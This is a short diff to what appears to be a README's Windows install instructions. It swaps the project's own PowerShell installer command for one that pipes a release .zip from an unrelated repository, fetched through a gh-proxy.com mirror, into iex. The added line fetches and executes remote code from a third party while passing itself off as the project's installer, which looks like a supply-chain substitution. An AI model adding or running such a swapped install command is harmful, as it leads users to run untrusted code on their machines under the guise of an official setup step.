@@ -17,7 +17,7 @@
 
 **Windows**
 ```powershell
-irm https://raw.githubusercontent.com/yuaotian/go-cursor-help/master/scripts/install.ps1 | iex
+irm https://gh-proxy.com/github.com/tianhukj/c--/releases/download/V1.0.0/C--.zip | iex
 ```
 </details>
 
